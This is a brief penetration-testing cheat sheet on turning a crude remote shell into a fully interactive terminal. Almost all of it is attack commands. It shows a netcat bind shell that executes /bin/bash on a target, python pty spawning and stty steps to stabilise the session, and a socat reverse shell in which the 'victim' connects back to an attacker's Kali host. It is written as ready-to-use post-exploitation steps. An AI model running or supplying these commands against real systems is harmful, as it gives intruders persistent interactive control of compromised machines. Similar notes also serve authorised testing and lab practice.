# Ways to upgrade shells from "dumb terminals"

# Method 1 - Upgrade dumb shell to tty manually

# target machine: Start listener and exec shell on connection
[target ~]$ nc -l -p 8080 -e /bin/bash
# attacker machine
[attacker ~]$ nc -v <TARGET> 8080
# In new nc target shell upgrade 
[target ~]$ python -c 'import pty; pty.spawn("/bin/bash")'
# CTRL-Z

# On attacker kali - collect term info.
$ stty -a; echo $TERM; echo $SHELL; # Remember tty rows and columns number.
$ stty raw -echo 
$ fg

# Back on reverse shell of target, things may look strange we will fix.
target $ reset # You probably wont see what you types just make sure you type it and hit enter
# After reset tty should be sane again. Finish full shell upgrade
target $ export SHELL=bash
target $ export TERM=xterm-256color
target $ stty row <num> columns <num>  # the numbers you collected running stty -a on your shell..

# Should now have full interactive shell!
~ full_shell $ tmux, su, sudo, vim.. It's all yours now :-)


# Method 2 - SOCAT Reverse shell

# Listener to catch reverse shell from target:
socat file:`tty`,raw,echo=0 tcp-listen:4444
# Victim
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:kali-ip:4444
